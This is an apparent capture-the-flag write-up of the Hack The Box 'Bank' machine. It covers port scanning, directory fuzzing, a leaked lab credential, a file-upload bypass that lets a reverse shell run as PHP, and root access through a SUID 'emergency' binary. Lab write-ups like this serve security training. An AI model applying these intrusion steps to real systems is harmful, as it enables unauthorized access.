# Bank

add bank.htb with ip address in /etc/hosts file

## Nmap scanning

```

sudo nmap -sS -sC 10.10.10.29

Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 21:03 EDT
Nmap scan report for 10.10.10.29
Host is up (1.1s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http
|_http-title: Apache2 Ubuntu Default Page: It works

Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds
```

## Web directory fuzzing

```

ffuf -u http://bank.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://bank.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

#                       [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# Priority ordered case-sensitive list, where entries were found [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# Copyright 2007 James Fisher [Status: 302, Size: 7322, Words: 3793, Lines: 189]
#                       [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# Suite 300, San Francisco, California, 94105, USA. [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# directory-list-2.3-medium.txt [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# This work is licensed under the Creative Commons [Status: 302, Size: 7322, Words: 3793, Lines: 189]
#                       [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# or send a letter to Creative Commons, 171 Second Street, [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# on at least 2 different hosts [Status: 302, Size: 7322, Words: 3793, Lines: 189]
uploads                 [Status: 301, Size: 305, Words: 20, Lines: 10]
#                       [Status: 302, Size: 7322, Words: 3793, Lines: 189]
                        [Status: 302, Size: 7322, Words: 3793, Lines: 189]
assets                  [Status: 301, Size: 304, Words: 20, Lines: 10]
inc                     [Status: 301, Size: 301, Words: 20, Lines: 10]
                        [Status: 302, Size: 7322, Words: 3793, Lines: 189]
server-status           [Status: 403, Size: 288, Words: 21, Lines: 11]
balance-transfer        [Status: 301, Size: 314, Words: 20, Lines: 10]
:: Progress: [220560/220560] :: Job [1/1] :: 83 req/sec :: Duration: [0:31:20] :: Errors: 33 ::
```

using dirsearch.py for file checking 

```

python3 dirsearch.py -u bank.htb

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                           
 (_||| _) (/_(_|| (_| )                                                                                                                                    
                                                                                                                                                           
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10909

Output File: /********************************/dirsearch/reports/bank.htb_21-07-06_23-08-07.txt

Error Log: /********************************/dirsearch/logs/errors-21-07-06_23-08-07.log

Target: http://bank.htb/
                                                                                                                                                           
[23:08:09] Starting: 
[23:08:21] 403 -  286B  - /.ht_wsr.txt                                                
--------------------------------------
--------------------------------------
[23:09:01] 301 -  304B  - /assets  ->  http://bank.htb/assets/                                                    
[23:09:01] 200 -    2KB - /assets/
[23:09:23] 301 -  301B  - /inc  ->  http://bank.htb/inc/                                              
[23:09:23] 200 -    1KB - /inc/         
[23:09:24] 302 -    7KB - /index.php  ->  login.php                                                            
[23:09:24] 302 -    7KB - /index.php/login/  ->  login.php
[23:09:29] 200 -    2KB - /login.php                                                                                 
[23:09:30] 302 -    0B  - /logout.php  ->  index.php
[23:09:39] 403 -  284B  - /php5.fcgi                                                    
[23:09:48] 403 -  288B  - /server-status                                                                
[23:09:48] 403 -  289B  - /server-status/
[23:09:54] 302 -    3KB - /support.php  ->  login.php                                                             
[23:09:59] 301 -  305B  - /uploads  ->  http://bank.htb/uploads/                          
[23:09:59] 403 -  283B  - /uploads/               
                                                                                                
Task Completed                                                                        
```

__/balance-transfer__ contains numbers of `.acc` file 

```

++OK ENCRYPT SUCCESS
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: D4W4EvSXkUNaLJSvizj9fUyv7do40lsDpoI4UA2evPohzhNRQ7161AB8N0dOlGsL4aQZLTdgJCyiUlaKscQtMsCAsQoOwQAB1rAMkO34rBnlWx5pJWTvov6RluFSlftm
Email: H391Sc6jNtEK0K9KG2g5ymWURBMcRfzyjIAbUHvIa9sbUCVAFcFdyC7pdUC59bEtTfFNWav6kYhfBdPgpvuY7Bnlv0rFb594kPSh0onlnFAYTpfiVJh2lFnRFOxQUGVf
Password: vNwvcUQzArytQNMLw3ORIcJn1geVW9bsXHY9CPJcghG65sSBwHteTcCUsRQp11SYJQ8lFSxV9d2eGVQcCkrwx4q0VhqWiiU183nNVUJ58MkOHb1kwsQ3wh3rytoRMjTU
CreditCards: 2
Transactions: 40
Balance: 7174522 .
===UserAccount===
```

.acc file contains encrypted name, email, password

but not all file contains encrypted data, a file with size 257 contains

```

--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

use this to login 

On main page, go for support, add new support and upload a file, particularly a reverse shell file with htb extension 
as support module runs .htb as .php

## Gaining access

use either metasploit or nc to start listener 

a shell will be opened on the listener

use python3 to generate an interactive shell

```
$ python3 -c "import pty; pty.spawn('/bin/bash')"

www-data@bank:/var/www$ ls
ls
bank  html
www-data@bank:/var/www$ cd /home
cd /home
www-data@bank:/home$ ls
ls
chris
www-data@bank:/home$ cat chris/user.txt    
cat chris/user.txt
********************************
www-data@bank:/home$ 
```

## Privilege escalation

```

www-data@bank:/home$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/var/htb/bin/emergency                                     < ------------------   interesting file
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount

www-data@bank:/var/htb/bin$ ./emergency
./emergency
#
```

```

www-data@bank:/var/htb/bin$ ./emergency
./emergency
# cd /root
cd /root
# cat root.txt
cat root.txt
*********************************
# 
```
